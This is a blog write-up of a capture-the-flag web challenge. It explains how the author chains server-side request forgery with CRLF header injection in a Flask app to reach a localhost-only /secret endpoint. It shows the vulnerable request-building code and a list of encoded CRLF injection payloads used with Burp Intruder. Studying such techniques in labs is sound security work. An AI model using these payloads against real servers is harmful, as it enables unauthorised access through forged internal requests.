---
layout: post
title: Gynvael's web security challenge - part 0.
subtitle: Quick hacking at the weekend.
gh-repo: daattali/beautiful-jekyll
tags: [ctf, hacking, challenges]
comments: true
---

Over the weekend I have decided to play with Gynvael's web security challenges. The post presents the write-up of challenge 0.
The challenge is located under the following URL:
http://challenges.gynvael.stream:5000/

The challenge is simple FLASK application running as the Werkzaug - flask development web server.
After the quick code analysis, we see that to complete the challenge we must get the response from the /secret endpoint

```
@app.route('/secret')
def secret():
  if request.remote_addr != "127.0.0.1":
    return "Access denied!"

  if request.headers.get("X-Secret", "") != "YEAH":
    return "Nope."

  return f"GOOD WORK! Flag is {FLAG}"
```

To get the flag we would have to bypass to conditional checks, the first requirement is that the request must come from the localhost. The second requirement is that the HTTP request must have the X-Secret HTTP header with the value of YEAH.

So, the get the flag, we would have to exploit the Server Side Request Forgery on the same server, to be able to send an HTTP request to the loopback interface. Then, we would have to find the HTTP Header Injection sometimes called CRLF injection to be able to send the custom X-Secret HTTP header.

Luckly for us the web server exposes other endpoint /fetch:
```
@app.route('/fetch', methods=["POST"])
def fetch():
  url = request.form.get("url", "")
  lang = request.form.get("lang", "en-US")

  if not url:
    return "URL must be provided"

  data = fetch_url(url, lang)
  if data is None:
    return "Failed."

  return Response(data, mimetype="text/plain;charset=utf-8")
```

Analyzing the parameters that the endpoint expects - url and lang, we can say that the endpoint perform SSRF for us by calling the fetch_url(url,lang) function. Interesting part in the fetch_url(url,lang) function is the part describing how the HTTP request is built:

```
  req = '\r\n'.join([
    f"GET {o.path} HTTP/1.1",
    f"Host: {o.netloc}",
    f"Connection: close",
    f"Accept-Language: {lang}",
    "",
    ""
  ])
```

As we can see it is simple string concatenation, so we would be able to provide the end of line characters and inject arbitrary HTTP Header to the request.

Let's go the exploitation, I would use the Burp Suite Community Edition for that. We first try to send the request to http://localhost:5000/secret without changing the language parameter.

![gyn_0](https://github.com/niebardzo/niebardzo.github.io/raw/master/img/2020-05-24-gyn0_1.png)


With that request, we would hit the second condition as the HTTP Header X-Secret is not set. Then, I would use Intruder to try different payloads for injecting the CRLF.

![gyn_0](https://github.com/niebardzo/niebardzo.github.io/raw/master/img/2020-05-24-gyn0_2.png)

I have prepared the following list of payloads to try which has some of the common encoded characters to do CRLF injection.
```
%0a%0aX-Secret:%20YEAH
%0aX-Secret:%20YEAH
%0d%0aX-Secret:%20YEAH
%0dX-Secret:%20YEAH
%23%0aX-Secret:%20YEAH
%23%0d%0aX-Secret:%20YEAH
%23%0dX-Secret:%20YEAH
%25%30%61X-Secret:%20YEAH
%25%30aX-Secret:%20YEAH
%250aX-Secret:%20YEAH
%25250aX-Secret:%20YEAH
%2e%2e%2f%0d%0aX-Secret:%20YEAH
%2f%2e%2e%0d%0aX-Secret:%20YEAH
%2F..%0d%0aX-Secret:%20YEAH
%3f%0d%0aX-Secret:%20YEAH
%3f%0dX-Secret:%20YEAH
%u000aX-Secret:%20YEAH
```

![gyn_0](https://github.com/niebardzo/niebardzo.github.io/raw/master/img/2020-05-24-gyn0_3.png)

Additionally, we go the Options tab and set the Grep-Match to "GOOD WORK!" as this shows up when the flag is returned.

![gyn_0](https://github.com/niebardzo/niebardzo.github.io/raw/master/img/2020-05-24-gyn0_4.png)

Then, we click "Start Attack", and see the results.

![gyn_0](https://github.com/niebardzo/niebardzo.github.io/raw/master/img/2020-05-24-gyn0_5.png)

As we can see few of the Intruder's requests returned the flag. We can now view the response with the flag.
